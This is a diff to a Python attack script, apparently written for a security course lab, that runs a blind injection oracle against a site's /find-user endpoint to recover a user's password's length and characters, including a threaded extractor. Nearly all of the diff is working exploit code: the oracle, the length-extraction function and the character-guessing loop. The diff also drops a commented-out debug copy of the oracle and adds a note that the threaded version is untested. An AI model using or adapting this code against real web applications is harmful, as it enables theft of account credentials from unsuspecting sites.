@@ -77,29 +77,6 @@ def oracle_fn(expr, target_url, session):
     match = re.search(r"/profile/(\d+)", profile_link["href"])
     return int(match.group(1)) if match else None
 
-# def oracle_fn(expr, target_url, session):
-#     payload = encode_payload(expr)
-#     url = f"{target_url}/find-user?u={payload}"
-#     print(f"[DEBUG] Request URL: {url}")
-#     r = session.get(url)
-#     print(f"[DEBUG] Status: {r.status_code}")
-#     print(f"[DEBUG] Snippet: {r.text[:500]}")  # show first 500 chars
-
-#     soup = BeautifulSoup(r.text, "html.parser")
-#     h1 = soup.find("h1", string="User search results...")
-#     if not h1:
-#         print("[DEBUG] <h1>User search results...</h1> not found")
-#         return None
-#     results_section = h1.find_next("div", class_="mt-3 pt-2")
-#     if not results_section:
-#         print("[DEBUG] div.mt-3.pt-2 not found after h1")
-#         return None
-#     profile_link = results_section.find("a", href=re.compile(r"/profile/(\\d+)", re.IGNORECASE))
-#     if not profile_link:
-#         print("[DEBUG] No profile link in correct section")
-#         return None
-#     match = re.search(r"/profile/(\\d+)", profile_link["href"])
-#     return int(match.group(1)) if match else None
 
 def extract_password_length(field, value, target_url, session):
     print(f"[*] Extracting password length using {field}={value}")
@@ -134,7 +111,10 @@ def guess_char(i, field, value, target_url, session):
             return (i, chr(ascii_code))
     return (i, '?')
 
+
 def extract_password_threaded(length, field, value, target_url, session, max_workers=4):
+    # Did not try this for the course module so unsure if it works
+    # TODO: to try if I have time
     print("[*] Extracting password using threads...")
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         futures = [executor.submit(guess_char, i, field, value, target_url, session) for i in range(1, length + 1)]
